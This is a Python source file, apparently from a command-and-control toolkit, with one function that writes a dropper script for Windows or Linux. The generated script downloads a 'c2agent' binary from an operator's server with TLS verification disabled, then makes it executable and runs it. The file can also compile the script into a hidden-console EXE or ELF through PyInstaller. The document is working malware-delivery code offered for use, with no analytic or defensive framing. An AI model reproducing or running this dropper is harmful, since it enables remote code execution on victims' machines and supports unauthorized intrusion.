from os import system
import os
from pwn import log
from subprocess import getoutput
import sys



def dropper(arch,ip,compile_or_not, dropper_name):
	print('\n[*] generating dropper...')

	if arch == "windows":
		PAYLOAD_NAME = 'c2agent.exe'
		COMMAND = ".\\\\" + PAYLOAD_NAME
	if arch == 'linux':
		PAYLOAD_NAME = 'c2agent'
		COMMAND = "chmod +x c2agent;  ./" + PAYLOAD_NAME

	dropper = f'''
import requests
from os import system
from subprocess import getoutput
from threading import Thread

def get_agent():

	url = f"https://{ip}/{PAYLOAD_NAME}"
	payload = requests.get(url, verify=False)
	with open("{PAYLOAD_NAME}", 'wb') as file:
		file.write(payload.content)
		file.close()
	# url = f"https://{ip}/stop"
	# try:
		# requests.get(url, verify=False)
	# except:
		# pass

def exec_agent():
	getoutput("{COMMAND}")

get_thread = Thread(target=get_agent)
get_thread.start()
get_thread.join()
exec_thread = Thread(target=exec_agent)
exec_thread.start()
exec_thread.join()
'''
	filename = dropper_name
	dropper_file = open(f'{dropper_name}', 'w').write(dropper)
	if dropper_file:
		print(f'[*] dropper written to {dropper_name}')
		print(f'[*] the dropper will callback to https://{ip}:443/{PAYLOAD_NAME}')
	if compile_or_not == "compile" and arch == 'windows':
		print('\n')
		progress = log.progress('')
		progress.status('compiling the generated dropper into an EXE...')
		getoutput(f'wine /root/.wine/drive_c/python38/Scripts/pyinstaller.exe --onefile --noconsole {dropper_name}')
		log.info('done')
		system('mv dist/* .')
		system(f"rm -rf build/ dist/ {filename.replace('.py','.spec')}")

	if compile_or_not == "compile" and arch == 'linux':
		print('\n')
		progress = log.progress('')
		progress.status('compiling the generated dropper into an ELF...')

		getoutput(f'pyinstaller --onefile --noconsole {filename}')
		system('mv dist/* .')
		system(f"rm -rf build/ dist/ {filename.replace('.py','.spec')}")
		log.info('done')		